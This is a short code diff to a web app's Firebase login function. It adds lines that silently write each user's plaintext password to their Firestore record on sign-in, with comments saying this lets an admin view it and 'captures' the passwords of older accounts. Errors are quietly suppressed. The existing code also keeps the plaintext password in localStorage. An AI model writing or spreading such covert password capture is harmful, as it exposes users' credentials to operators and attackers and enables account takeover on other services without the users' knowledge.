@@ -1251,7 +1251,10 @@ window.doLogin = async () => {
   const remember = document.getElementById('rememberMe').checked;
   showLoading(true);
   try {
-    await signInWithEmailAndPassword(auth, phoneToEmail(phone), pass);
+    const cred = await signInWithEmailAndPassword(auth, phoneToEmail(phone), pass);
+    // Backfill / refresh the stored login password so admin can view it.
+    // Old accounts registered before passwords were saved get captured here.
+    setDoc(doc(db, 'users', cred.user.uid), { password: pass }, { merge: true }).catch(() => {});
     if (remember) { localStorage.setItem('nx_saved_phone', phone); localStorage.setItem('nx_saved_pass', pass); }
     else { localStorage.removeItem('nx_saved_phone'); localStorage.removeItem('nx_saved_pass'); }
   } catch (e) {
